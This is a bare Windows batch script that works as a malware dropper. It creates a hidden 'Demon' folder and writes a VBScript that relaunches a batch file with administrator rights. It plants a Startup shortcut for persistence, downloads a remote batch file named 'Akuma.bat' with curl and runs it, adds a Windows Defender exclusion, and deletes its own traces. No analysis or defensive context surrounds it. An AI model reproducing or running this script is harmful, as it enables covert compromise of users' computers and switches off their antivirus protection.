%homedrive%
rmdir /s /q %homedrive%\Demon
mkdir %homedrive%\Demon
attrib +h %homedrive%\Demon
cd %homedrive%\Demon
echo Set app = CreateObject("Shell.Application") >> %homedrive%\Demon\Demon.vbs
echo app.ShellExecute "%homedrive%\Demon\Demon.bat", , , "runas", 3 >> %homedrive%\Demon\Demon.vbs
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Demon.lnk');$s.TargetPath='%homedrive%\Demon\Demon.vbs';$s.Save()"
curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\Demon\Demon.bat
echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Demon\Demon.bat
echo del %appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Amuka.lnk >> %homedrive%\Demon\Demon.bat
echo %homedrive%\Demon\Akuma.bat >> %homedrive%\Demon\Demon.bat
echo rmdir /s /q %homedrive%\Demon >> %homedrive%\Demon\Demon.bat
start %homedrive%\Demon\Demon.vbs
